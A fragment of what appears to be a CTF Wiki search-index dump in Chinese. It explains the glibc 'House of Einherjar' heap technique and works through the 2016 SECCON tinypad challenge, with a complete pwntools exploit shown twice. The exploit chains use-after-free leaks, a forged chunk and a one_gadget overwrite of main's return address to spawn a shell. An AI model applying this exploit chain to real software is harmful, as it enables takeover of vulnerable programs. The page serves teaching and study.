\np64\n(\n0\n)\n \n+\n \np64\n(\nfakechunk_size\n)\n \n+\n \np64\n(\nfakechunk_addr\n)\n \n+\n \np64\n(\n\n        \nfakechunk_addr\n)\n\n    \nedit\n(\n3\n,\n \nd\n \n*\n \n0x20\n \n+\n \nfakechunk\n)\n\n\n    \n# overwrite idx 1\ns prev_size and\n\n    \n# set minaddr of size to \n\\x00\n\n    \n# idx 0\ns chunk size is 0x20\n\n    \ndiff\n \n=\n \nheap_base\n \n+\n \n0x20\n \n-\n \nfakechunk_addr\n\n    \nlog\n.\ninfo\n(\ndiff between idx1 and fakechunk: \n \n+\n \nhex\n(\ndiff\n))\n\n    \n# \n\\0\n padding caused by strcpy\n\n    \ndiff_strip\n \n=\n \np64\n(\ndiff\n)\n.\nstrip\n(\n\\0\n)\n\n    \nnumber_of_zeros\n \n=\n \nlen\n(\np64\n(\ndiff\n))\n \n-\n \nlen\n(\ndiff_strip\n)\n\n    \nfor\n \ni\n \nin\n \nrange\n(\nnumber_of_zeros\n \n+\n \n1\n):\n\n        \ndata\n \n=\n \ndiff_strip\n.\nrjust\n(\n0x18\n \n-\n \ni\n,\n \nf\n)\n\n        \nedit\n(\n1\n,\n \ndata\n)\n\n    \ndelete\n(\n2\n)\n\n    \np\n.\nrecvuntil\n(\n\\n\nDeleted.\n)\n\n\n    \n# fix the fake chunk size, fd and bk\n\n    \n# fd and bk must be unsorted bin\n\n    \nedit\n(\n4\n,\n \nd\n \n*\n \n0x20\n \n+\n \np64\n(\n0\n)\n \n+\n \np64\n(\n0x101\n)\n \n+\n \np64\n(\nmain_arena\n \n+\n \n88\n)\n \n+\n\n         \np64\n(\nmain_arena\n \n+\n \n88\n))\n\n\n    \n# 3. overwrite malloc_hook with one_gadget\n\n\n    \none_gadget_addr\n \n=\n \nlibc_base\n \n+\n \n0x45216\n\n    \nenviron_pointer\n \n=\n \nlibc_base\n \n+\n \nlibc\n.\nsymbols\n[\n__environ\n]\n\n    \nlog\n.\ninfo\n(\none gadget addr: \n \n+\n \nhex\n(\none_gadget_addr\n))\n\n    \nlog\n.\ninfo\n(\nenviron pointer addr: \n \n+\n \nhex\n(\nenviron_pointer\n))\n\n    \n#fake_malloc_chunk = main_arena - 60 + 9\n\n    \n# set memo[0].size = \na\n*8,\n\n    \n# set memo[0].content point to environ to leak environ addr\n\n    \nfake_pad\n \n=\n \nf\n \n*\n \n(\n0x100\n \n-\n \n0x20\n \n-\n \n0x10\n)\n \n+\n \na\n \n*\n \n8\n \n+\n \np64\n(\n\n        \nenviron_pointer\n)\n \n+\n \na\n \n*\n \n8\n \n+\n \np64\n(\n0x602148\n)\n\n    \n# get a fake chunk\n\n    \nadd\n(\n0x100\n \n-\n \n8\n,\n \nfake_pad\n)\n  \n# idx 2\n\n    \n#gdb.attach(p)\n\n\n    \n# get environ addr\n\n    \np\n.\nrecvuntil\n(\n # CONTENT: \n)\n\n    \nenviron_addr\n \n=\n \np\n.\nrecvuntil\n(\n\\n\n,\n \ndrop\n=\nTrue\n)\n.\nljust\n(\n8\n,\n \n\\x00\n)\n\n    \nenviron_addr\n \n=\n \nu64\n(\nenviron_addr\n)\n\n    \nmain_ret_addr\n \n=\n \nenviron_addr\n \n-\n \n30\n \n*\n \n8\n\n\n    \n# set memo[0].content point to main_ret_addr\n\n    \nedit\n(\n2\n,\n \np64\n(\nmain_ret_addr\n))\n\n    \n# overwrite main_ret_addr with one_gadget addr\n\n    \nedit\n(\n1\n,\n \np64\n(\none_gadget_addr\n))\n\n    \np\n.\ninteractive\n()\n\n\n\n\nif\n \n__name__\n \n==\n \n__main__\n:\n\n    \nrun\n()\n\n\n\n\n\n\u53c2\u8003\u6587\u732e\n\n\n\n\nhttps://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606\n\n\nhttps://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf", 
            "title": "House Of Einherjar"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#house-of-einherjar", 
            "text": "", 
            "title": "House Of Einherjar"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#_1", 
            "text": "house of einherjar \u662f\u4e00\u79cd\u5806\u5229\u7528\u6280\u672f\uff0c\u7531  Hiroki Matsukuma  \u63d0\u51fa\u3002\u8be5\u5806\u5229\u7528\u6280\u672f\u53ef\u4ee5\u5f3a\u5236\u4f7f\u5f97  malloc  \u8fd4\u56de\u4e00\u4e2a\u51e0\u4e4e\u4efb\u610f\u5730\u5740\u7684 chunk \u3002\u5176\u4e3b\u8981\u5728\u4e8e\u6ee5\u7528  free  \u4e2d\u7684\u540e\u5411\u5408\u5e76\u64cd\u4f5c\uff08\u5408\u5e76\u4f4e\u5730\u5740\u7684chunk\uff09\uff0c\u4ece\u800c\u4f7f\u5f97\u5c3d\u53ef\u80fd\u907f\u514d\u788e\u7247\u5316\u3002  \u6b64\u5916\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u4e00\u4e9b\u7279\u6b8a\u5927\u5c0f\u7684\u5806\u5757\u4e2d\uff0coff by one \u4e0d\u4ec5\u53ef\u4ee5\u4fee\u6539\u4e0b\u4e00\u4e2a\u5806\u5757\u7684 prev_size\uff0c\u8fd8\u53ef\u4ee5\u4fee\u6539\u4e0b\u4e00\u4e2a\u5806\u5757\u7684 PREV_INUSE \u6bd4\u7279\u4f4d\u3002", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#_2", 
            "text": "", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#_3", 
            "text": "free  \u51fd\u6570\u4e2d\u7684\u540e\u5411\u5408\u5e76\u6838\u5fc3\u64cd\u4f5c\u5982\u4e0b           /* consolidate backward */ \n         if   ( ! prev_inuse ( p ))   { \n             prevsize   =   prev_size ( p ); \n             size   +=   prevsize ; \n             p   =   chunk_at_offset ( p ,   - (( long )   prevsize )); \n             unlink ( av ,   p ,   bck ,   fwd ); \n         }   \u8fd9\u91cc\u501f\u7528\u539f\u4f5c\u8005\u7684\u4e00\u5f20\u56fe\u7247\u8bf4\u660e   \u5173\u4e8e\u6574\u4f53\u7684\u64cd\u4f5c\uff0c\u8bf7\u53c2\u8003  \u6df1\u5165\u7406\u89e3\u5806\u7684\u5b9e\u73b0  \u90a3\u4e00\u7ae0\u8282\u3002", 
            "title": "\u540e\u5411\u5408\u5e76\u64cd\u4f5c"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#_4", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u5c31\u4ecb\u7ecd\u8be5\u5229\u7528\u7684\u539f\u7406\u3002\u9996\u5148\uff0c\u5728\u4e4b\u524d\u7684\u5806\u7684\u4ecb\u7ecd\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u4ee5\u4e0b\u7684\u77e5\u8bc6   \u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684 chunk \u4f1a\u5171\u4eab  prev_size \u5b57\u6bb5\uff0c\u5c24\u5176\u662f\u5f53\u4f4e\u5730\u5740\u7684 chunk \u5904\u4e8e\u4f7f\u7528\u72b6\u6001\u65f6\uff0c\u9ad8\u5730\u5740\u7684chunk\u7684\u8be5\u5b57\u6bb5\u4fbf\u53ef\u4ee5\u88ab\u4f4e\u5730\u5740\u7684 chunk \u4f7f\u7528\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u6709\u5e0c\u671b\u53ef\u4ee5\u901a\u8fc7\u5199\u4f4e\u5730\u5740 chunk \u8986\u76d6\u9ad8\u5730\u5740 chunk \u7684  prev_size  \u5b57\u6bb5\u3002  \u4e00\u4e2a chunk PREV_INUSE \u4f4d\u6807\u8bb0\u4e86\u5176\u7269\u7406\u76f8\u90bb\u7684\u4f4e\u5730\u5740 chunk \u7684\u4f7f\u7528\u72b6\u6001\uff0c\u800c\u4e14\u8be5\u4f4d\u662f\u548c prev_size \u7269\u7406\u76f8\u90bb\u7684\u3002  \u540e\u5411\u5408\u5e76\u65f6\uff0c\u65b0\u7684 chunk \u7684\u4f4d\u7f6e\u53d6\u51b3\u4e8e  chunk_at_offset(p, -((long) prevsize))  \u3002   \u90a3\u4e48\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u540c\u65f6\u63a7\u5236\u4e00\u4e2achunk prev_size \u4e0e PREV_INUSE \u5b57\u6bb5\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5c06\u65b0\u7684 chunk \u6307\u5411\u51e0\u4e4e\u4efb\u4f55\u4f4d\u7f6e\u3002", 
            "title": "\u5229\u7528\u539f\u7406"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#_5", 
            "text": "", 
            "title": "\u5229\u7528\u8fc7\u7a0b"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#_6", 
            "text": "\u5047\u8bbe\u6ea2\u51fa\u524d\u7684\u72b6\u6001\u5982\u4e0b", 
            "title": "\u6ea2\u51fa\u524d"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#_7", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe p0 \u5806\u5757\u4e00\u65b9\u9762\u53ef\u4ee5\u5199prev_size\u5b57\u6bb5\uff0c\u53e6\u4e00\u65b9\u9762\uff0c\u5b58\u5728off by one\u7684\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u5199\u4e0b\u4e00\u4e2a chunk \u7684PREV_INUSE \u90e8\u5206\uff0c\u90a3\u4e48", 
            "title": "\u6ea2\u51fa"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#_8", 
            "text": "\u5047\u8bbe\u6211\u4eec\u5c06 p1\u7684 prev_size \u5b57\u6bb5\u8bbe\u7f6e\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u76ee\u7684 chunk \u4f4d\u7f6e\u4e0ep1\u7684\u5dee\u503c \u3002\u5728\u6ea2\u51fa\u540e\uff0c\u6211\u4eec\u91ca\u653ep1\uff0c\u5219\u6211\u4eec\u6240\u5f97\u5230\u7684\u65b0\u7684 chunk \u7684\u4f4d\u7f6e  chunk_at_offset(p1, -((long) prevsize))  \u5c31\u662f\u6211\u4eec\u60f3\u8981\u7684 chunk \u4f4d\u7f6e\u4e86\u3002  \u5f53\u7136\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e\u8fd9\u91cc\u4f1a\u5bf9\u65b0\u7684 chunk \u8fdb\u884c unlink \uff0c\u56e0\u6b64\u9700\u8981\u786e\u4fdd\u5728\u5bf9\u5e94 chunk \u4f4d\u7f6e\u6784\u9020\u597d\u4e86fake chunk \u4ee5\u4fbf\u4e8e\u7ed5\u8fc7 unlink \u7684\u68c0\u6d4b\u3002", 
            "title": "\u6ea2\u51fa\u540e"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#_9", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u603b\u7ed3\u4e0b\u8fd9\u4e2a\u5229\u7528\u6280\u672f\u9700\u8981\u6ce8\u610f\u7684\u5730\u65b9   \u9700\u8981\u6709\u6ea2\u51fa\u6f0f\u6d1e\u53ef\u4ee5\u5199\u7269\u7406\u76f8\u90bb\u7684\u9ad8\u5730\u5740\u7684 prev_size \u4e0e PREV_INUSE \u90e8\u5206\u3002  \u6211\u4eec\u9700\u8981\u8ba1\u7b97\u76ee\u7684 chunk \u4e0e p1 \u5730\u5740\u4e4b\u95f4\u7684\u5dee\uff0c\u6240\u4ee5\u9700\u8981\u6cc4\u6f0f\u5730\u5740\u3002  \u6211\u4eec\u9700\u8981\u5728\u76ee\u7684 chunk \u9644\u8fd1\u6784\u9020\u76f8\u5e94\u7684 fake chunk\uff0c\u4ece\u800c\u7ed5\u8fc7 unlink \u7684\u68c0\u6d4b\u3002   \u5176\u5b9e\uff0c\u8be5\u6280\u672f\u4e0e chunk extend/shrink \u6280\u672f\u6bd4\u8f83\u7c7b\u4f3c\u3002", 
            "title": "\u603b\u7ed3"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#2016-seccon-tinypad", 
            "text": "", 
            "title": "2016 Seccon tinypad"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#_10", 
            "text": "\u9996\u5148\uff0c\u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u4ee5\u6765\u4e00\u4e2a\u6838\u5fc3\u7684\u8bfb\u53d6\u51fd\u6570\uff0c\u5373\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u5b57\u8282\u7684\u5b57\u7b26\u4e32\uff0c\u7136\u800c\uff0c\u5f53\u8bfb\u53d6\u7684\u957f\u5ea6\u6070\u597d\u4e3a\u6307\u5b9a\u7684\u957f\u5ea6\u65f6\uff0c\u4f1a\u51fa\u73b0  off by one \u7684\u6f0f\u6d1e \u3002  \u901a\u8fc7\u5206\u6790\u7a0b\u5e8f\uff0c\u6211\u4eec\u4e0d\u96be\u770b\u51fa\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u57fa\u672c\u529f\u80fd\u662f\u64cd\u4f5c\u4e00\u4e2a tinypad\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u64cd\u4f5c   \u5f00\u5934\uff0c\u7a0b\u5e8f\u6bcf\u6b21\u5f00\u5934\u4f9d\u6b21\u5224\u65ad\u6bcf\u4e2a memo \u7684\u6307\u9488\u6765\u5224\u65ad\u662f\u5426\u4e3a\u7a7a\uff0c\u5982\u679c\u4e0d\u4e3a\u7a7a\uff0c\u8fdb\u800c\u5229\u7528 strlen \u6c42\u5f97\u5176\u76f8\u5e94\u7684\u957f\u5ea6\uff0c\u5c06 memo \u7684\u5185\u5bb9\u8f93\u51fa\u3002\u4ece\u8fd9\u91cc\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u770b\u51fa\u6700\u591a\u6709 4 \u4e2a memo\u3002  \u6dfb\u52a0 memo\uff0c\u904d\u5386\u5b58\u50a8 memo \u7684\u53d8\u91cftinypad\uff0c\u6839\u636e tinypad \u7684\u5b58\u50a8\u7684\u5927\u5c0f\u5224\u65ad memo \u662f\u5426\u5728\u4f7f\u7528\uff0c\u7136\u540e\u8fd8\u6709\u7684\u8bdd\uff0c\u5206\u914d\u4e00\u4e2a memo\u3002\u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\uff0c\u7a0b\u5e8f\u53ea\u662f\u4ece tinypad \u8d77\u59cb\u504f\u79fb16*16=256 \u5904\u624d\u5f00\u59cb\u4f7f\u7528\uff0c\u6bcf\u4e2a memo \u5b58\u50a8\u4e24\u4e2a\u5b57\u6bb5\uff0c\u4e00\u4e2a\u662f\u8be5 memo \u7684\u5927\u5c0f\uff0c\u53e6\u4e00\u4e2a\u662f\u8be5 memo \u5bf9\u5e94\u7684\u6307\u9488\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u7ed3\u6784\u4f53\uff0c\u5e76\u4fee\u6539 ida \u8bc6\u522b\u7684 tinypad\uff0c\u4f7f\u4e4b\u66f4\u52a0\u53ef\u8bfb\uff08\u4f46\u662f\u5176\u5b9e ida \u6ca1\u6709\u529e\u6cd5\u5e2e\u5fd9\u667a\u80fd\u8bc6\u522b\u3002\uff09\u3002\u540c\u65f6\uff0c\u7531\u4e8e\u8be5\u6dfb\u52a0\u529f\u80fd\u4f9d\u8d56\u4e8e\u8bfb\u53d6\u51fd\u6570\uff0c\u6240\u4ee5\u5b58\u5728 off by one \u7684\u6f0f\u6d1e\u3002\u6b64\u5916\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0c\u7528\u6237\u7533\u8bf7\u7684 chunk \u7684\u5927\u5c0f\u6700\u5927\u4e3a 256 \u5b57\u8282\uff0c\u548c tinypad \u524d\u9762\u7684\u672a\u4f7f\u7528\u7684 256 \u5b57\u8282\u6070\u597d\u4e00\u81f4\u3002  \u5220\u9664\uff0c\u6839\u636e\u5b58\u50a8 memo \u7684\u5927\u5c0f\u5224\u65ad memo \u662f\u5426\u5728\u88ab\u4f7f\u7528\uff0c\u540c\u65f6\u5c06\u76f8\u5e94 memo \u5927\u5c0f\u8bbe\u7f6e\u4e3a0\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u5c06\u6307\u9488\u8bbe\u7f6e\u4e3a NULL\uff0c\u6709\u53ef\u80fd\u4f1a\u5bfc\u81f4 Use After Free\u3002 \u5373\u5728\u7a0b\u5e8f\u5f00\u5934\u65f6\uff0c\u5c31\u6709\u53ef\u80fd\u8f93\u51fa\u4e00\u4e9b\u76f8\u5173\u7684\u5185\u5bb9\uff0c\u8fd9\u5176\u5b9e\u5c31\u662f\u6211\u4eec\u6cc4\u6f0f\u4e00\u4e9b\u57fa\u5730\u5740\u7684\u57fa\u7840 \u3002  \u7f16\u8f91\u3002\u5728\u7f16\u8f91\u65f6\uff0c\u7a0b\u5e8f\u9996\u5148\u6839\u636e\u4e4b\u524d\u5b58\u50a8\u7684 memo \u7684\u5185\u5bb9\u5c06\u5176\u62f7\u8d1d\u5230 tinypad \u7684\u524d 256 \u4e2a\u5b57\u8282\u4e2d\uff0c\u4f46\u6b63\u5982\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\u7684\uff0c\u5f53 memo \u5b58\u50a8\u4e86 256 \u4e2a\u5b57\u8282\u65f6\uff0c\u5c31\u4f1a\u5b58\u5728 off by one\u6f0f\u6d1e\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u7a0b\u5e8f\u5229\u7528 strlen \u5224\u65ad\u590d\u5236\u4e4b\u540e\u7684 tinypad \u7684\u5185\u5bb9\u957f\u5ea6\uff0c\u5e76\u5c06\u5176\u8f93\u51fa\u3002\u4e4b\u540e\u7a0b\u5e8f\u7ee7\u7eed\u5229\u7528 strlen \u6c42\u5f97 memo \u7684\u957f\u5ea6\uff0c\u5e76\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u5185\u5bb9\u5230 tinypad \u4e2d\uff0c\u6839\u636e\u8bfb\u53d6\u51fd\u6570\uff0c\u8fd9\u91cc\u5fc5\u7136\u51fa\u73b0\u4e86  \\x00 \u3002\u6700\u540e\u7a0b\u5e8f\u5c06\u8bfb\u53d6\u5230 tinypad \u524d 256 \u5b57\u8282\u7684\u5185\u5bb9\u653e\u5230\u5bf9\u5e94 memo \u4e2d\u3002  \u9000\u51fa", 
            "title": "\u57fa\u672c\u529f\u80fd\u5206\u6790"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#_11", 
            "text": "\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b   \u5229\u7528\u5220\u9664\u65f6\u6ca1\u6709\u5c06\u6307\u9488\u7f6e\u4e3aNULL\u7684 UAF \u6f0f\u6d1e\uff0c\u6cc4\u6f0f\u5806\u7684\u57fa\u5730\u5740  \u518d\u6b21\u5229\u7528 UAF \u6f0f\u6d1e\u6cc4\u6f0f libc \u7684\u57fa\u5730\u5740\u3002  \u5229\u7528 house of einherjar \u65b9\u6cd5\u5728 tinypad \u7684\u524d 256 \u5b57\u8282\u4e2d\u4f2a\u9020 chunk\u3002\u5f53\u6211\u4eec\u518d\u6b21\u7533\u8bf7\u65f6\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u63a7\u52364\u4e2a memo \u7684\u6307\u9488\u548c\u5185\u5bb9\u4e86\u3002  \u8fd9\u91cc\u867d\u7136\u6211\u4eec\u7684\u7b2c\u4e00\u60f3\u6cd5\u53ef\u80fd\u662f\u76f4\u63a5\u8986\u76d6 malloc_hook \u4e3a one_gadget \u5730\u5740\uff0c\u4f46\u662f\uff0c\u7531\u4e8e\u5f53\u7f16\u8f91\u65f6\uff0c\u7a0b\u5e8f\u662f\u5229\u7528 strlen \u6765\u5224\u8bfb\u53ef\u4ee5\u8bfb\u53d6\u591a\u5c11\u957f\u5ea6\uff0c\u800c malloc_hook \u5219\u5728\u521d\u59cb\u65f6\u4e3a 0\u3002\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u8986\u76d6\uff0c\u6240\u4ee5\u8fd9\u91cc\u91c7\u7528\u5176\u4ed6\u65b9\u6cd5\uff0c\u5373\u4fee\u6539\u7a0b\u5e8f\u7684 main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4e3a one_gadget\uff0c\u4e4b\u6240\u4ee5\u53ef\u4ee5\u884c\u5f97\u901a\uff0c\u662f\u56e0\u4e3a\u8fd4\u56de\u5730\u5740\u5f80\u5f80\u662f 7f \u5f00\u5934\u7684\uff0c\u957f\u5ea6\u8db3\u591f\u957f\uff0c\u53ef\u4ee5\u8986\u76d6\u4e3aone_gadget\u3002\u6240\u4ee5\u6211\u4eec\u8fd8\u662f\u9700\u8981\u6cc4\u6f0f main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\uff0c\u7531\u4e8e libc \u4e2d\u5b58\u50a8\u4e86 main \u51fd\u6570 environ \u6307\u9488\u7684\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5148\u6cc4\u9732\u51faenviron \u7684\u5730\u5740\uff0c\u7136\u540e\u5728\u5f97\u77e5\u5b58\u50a8 main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002\u8fd9\u91cc\u9009\u53d6 environ \u7b26\u53f7\u662f\u56e0\u4e3a environ \u7b26\u53f7\u5728 libc \u4e2d\u4f1a\u5bfc\u51fa\uff0c\u800c\u50cf argc \u548c argv \u5219\u4e0d\u4f1a\u5bfc\u51fa\uff0c\u76f8\u5bf9\u6765\u8bf4\u4f1a\u6bd4\u8f83\u9ebb\u70e6\u4e00\u70b9\u3002  \u6700\u540e\u4fee\u6539 main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4e3a one_gadget \u5730\u5740\u83b7\u53d6shell\u3002   \u5177\u4f53\u5229\u7528\u811a\u672c\u5982\u4e0b  from   pwn   import   *  context . terminal   =   [ gnome-terminal ,   -x ,   sh ,   -c ]  if   args [ DEBUG ]: \n     context . log_level   =   debug  tinypad   =   ELF ( ./tinypad )  if   args [ REMOTE ]: \n     p   =   remote ( 127.0.0.1 ,   7777 ) \n     libc   =   ELF ( ./libc.so.6 )  else : \n     p   =   process ( ./tinypad ) \n     libc   =   ELF ( ./libc.so.6 ) \n     main_arena_offset   =   0x3c4b20  log . info ( PID:    +   str ( proc . pidof ( p )[ 0 ]))  def   add ( size ,   content ): \n     p . recvuntil ( (CMD)   ) \n     p . sendline ( a ) \n     p . recvuntil ( (SIZE)   ) \n     p . sendline ( str ( size )) \n     p . recvuntil ( (CONTENT)   ) \n     p . sendline ( content )  def   edit ( idx ,   content ): \n     p . recvuntil ( (CMD)   ) \n     p . sendline ( e ) \n     p . recvuntil ( (INDEX)   ) \n     p . sendline ( str ( idx )) \n     p . recvuntil ( (CONTENT)   ) \n     p . sendline ( content ) \n     p . recvuntil ( Is it OK? \\n ) \n     p . sendline ( Y )  def   delete ( idx ): \n     p . recvuntil ( (CMD)   ) \n     p . sendline ( d ) \n     p . recvuntil ( (INDEX)   ) \n     p . sendline ( str ( idx ))  def   run (): \n     p . recvuntil ( \n           ============================================================================ \\n\\n \n     ) \n     # 1. leak heap base \n     add ( 0x70 ,   a   *   8 )    # idx 0 \n     add ( 0x70 ,   b   *   8 )    # idx 1 \n     add ( 0x100 ,   c   *   8 )    # idx 2 \n\n     delete ( 2 )    # delete idx 1 \n     delete ( 1 )    # delete idx 0, idx 0 point to idx 1 \n     p . recvuntil (  # CONTENT:  ) \n     data   =   p . recvuntil ( \\n ,   drop = True )    # get pointer point to idx1 \n     heap_base   =   u64 ( data . ljust ( 8 ,   \\x00 ))   -   0x80 \n     log . success ( get heap base:    +   hex ( heap_base )) \n\n     # 2. leak libc base \n     # this will trigger malloc_consolidate \n     # first idx0 will go to unsorted bin \n     # second idx1 will merge with idx0(unlink), and point to idx0 \n     # third idx1 will merge into top chunk \n     # but cause unlink feture, the idx0 s fd and bk won t change \n     # so idx0 will leak the unsorted bin addr \n     delete ( 3 ) \n     p . recvuntil (  # CONTENT:  ) \n     data   =   p . recvuntil ( \\n ,   drop = True ) \n     unsorted_offset_arena   =   8   +   10   *   8 \n     main_arena   =   u64 ( data . ljust ( 8 ,   \\x00 ))   -   unsorted_offset_arena \n     libc_base   =   main_arena   -   main_arena_offset \n     log . success ( main arena addr:    +   hex ( main_arena )) \n     log . success ( libc base addr:    +   hex ( libc_base )) \n\n     # 3. house of einherjar \n     add ( 0x18 ,   a   *   0x18 )    # idx 0 \n     # we would like trigger house of einherjar at idx 1 \n     add ( 0x100 ,   b   *   0xf8   +   \\x11 )    # idx 1 \n     add ( 0x100 ,   c   *   0xf8 )    # idx 2 \n     add ( 0x100 ,   d   *   0xf8 )    #idx 3 \n\n     # create a fake chunk in tinypad s 0x100 buffer, offset 0x20 \n     tinypad_addr   =   0x602040 \n     fakechunk_addr   =   tinypad_addr   +   0x20 \n     fakechunk_size   =   0x101 \n     fakechunk   =   p64 ( 0 )   +   p64 ( fakechunk_size )   +   p64 ( fakechunk_addr )   +   p64 ( \n         fakechunk_addr ) \n     edit ( 3 ,   d   *   0x20   +   fakechunk ) \n\n     # overwrite idx 1 s prev_size and \n     # set minaddr of size to  \\x00 \n     # idx 0 s chunk size is 0x20 \n     diff   =   heap_base   +   0x20   -   fakechunk_addr \n     log . info ( diff between idx1 and fakechunk:    +   hex ( diff )) \n     #  \\0  padding caused by strcpy \n     diff_strip   =   p64 ( diff ) . strip ( \\0 ) \n     number_of_zeros   =   len ( p64 ( diff ))   -   len ( diff_strip ) \n     for   i   in   range ( number_of_zeros   +   1 ): \n         data   =   diff_strip . rjust ( 0x18   -   i ,   f ) \n         edit ( 1 ,   data ) \n     delete ( 2 ) \n     p . recvuntil ( \\n Deleted. ) \n\n     # fix the fake chunk size, fd and bk \n     # fd and bk must be unsorted bin \n     edit ( 4 ,   d   *   0x20   +   p64 ( 0 )   +   p64 ( 0x101 )   +   p64 ( main_arena   +   88 )   + \n          p64 ( main_arena   +   88 )) \n\n     # 3. overwrite malloc_hook with one_gadget \n\n     one_gadget_addr   =   libc_base   +   0x45216 \n     environ_pointer   =   libc_base   +   libc . symbols [ __environ ] \n     log . info ( one gadget addr:    +   hex ( one_gadget_addr )) \n     log . info ( environ pointer addr:    +   hex ( environ_pointer )) \n     #fake_malloc_chunk = main_arena - 60 + 9 \n     # set memo[0].size =  a *8, \n     # set memo[0].content point to environ to leak environ addr \n     fake_pad   =   f   *   ( 0x100   -   0x20   -   0x10 )   +   a   *   8   +   p64 ( \n         environ_pointer )   +   a   *   8   +   p64 ( 0x602148 ) \n     # get a fake chunk \n     add ( 0x100   -   8 ,   fake_pad )    # idx 2 \n     #gdb.attach(p) \n\n     # get environ addr \n     p . recvuntil (  # CONTENT:  ) \n     environ_addr   =   p . recvuntil ( \\n ,   drop = True ) . ljust ( 8 ,   \\x00 ) \n     environ_addr   =   u64 ( environ_addr ) \n     main_ret_addr   =   environ_addr   -   30   *   8 \n\n     # set memo[0].content point to main_ret_addr \n     edit ( 2 ,   p64 ( main_ret_addr )) \n     # overwrite main_ret_addr with one_gadget addr \n     edit ( 1 ,   p64 ( one_gadget_addr )) \n     p . interactive ()  if   __name__   ==   __main__ : \n     run ()", 
            "title": "\u5229\u7528"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#_12", 
            "text": "https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606  https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf", 
            "title": "\u53c2\u8003\u6587\u732e"
        }, 
        {
            "location": "/pwn/heap/house_of_lore/", 
            "text": "House of Lore\n\n\n\u6982\u8ff0\n\n\nHouse of Lore \u653b\u51fb\u4e0e Glibc \u5806\u7ba1\u7406\u4e2d\u7684\u7684 Small Bin \u7684\u673a\u5236\u7d27\u5bc6\u76f8\u5173\u3002\n\n\nHouse of Lore \u53ef\u4ee5\u5b9e\u73b0\u5206\u914d\u4efb\u610f\u6307\u5b9a\u4f4d\u7f6e\u7684 chunk\uff0c\u4ece\u800c\u4fee\u6539\u4efb\u610f\u5730\u5740\u7684\u5185\u5b58\u3002\n\n\nHouse of Lore \u5229\u7528\u7684\u524d\u63d0\u662f\u9700\u8981\u63a7\u5236 Small Bin Chunk \u7684 bk \u6307\u9488\uff0c\u5e76\u4e14\u63a7\u5236\u6307\u5b9a\u4f4d\u7f6e chunk \u7684 fd \u6307\u9488\u3002\n\n\n\u57fa\u672c\u539f\u7406\n\n\n\u5982\u679c\u5728 malloc \u7684\u65f6\u5019\uff0c\u7533\u8bf7\u7684\u5185\u5b58\u5757\u5728 small bin \u8303\u56f4\u5185\uff0c\u90a3\u4e48\u6267\u884c\u7684\u6d41\u7a0b\u5982\u4e0b\n\n\n    \n/*\n\n\n       If a small request, check regular bin.  Since these \nsmallbins\n\n\n       hold one size each, no searching within bins is necessary.\n\n\n       (For a large request, we need to wait until unsorted chunks are\n\n\n       processed to find best fit. But for small ones, fits are exact\n\n\n       anyway, so we can check now, which is faster.)\n\n\n     */\n\n\n    \nif\n \n(\nin_smallbin_range\n(\nnb\n))\n \n{\n\n        \n// \u83b7\u53d6 small bin \u7684\u7d22\u5f15\n\n        \nidx\n \n=\n \nsmallbin_index\n(\nnb\n);\n\n        \n// \u83b7\u53d6\u5bf9\u5e94 small bin \u4e2d\u7684 chunk \u6307\u9488\n\n        \nbin\n \n=\n \nbin_at\n(\nav\n,\n \nidx\n);\n\n        \n// \u5148\u6267\u884c victim= last(bin)\uff0c\u83b7\u53d6 small 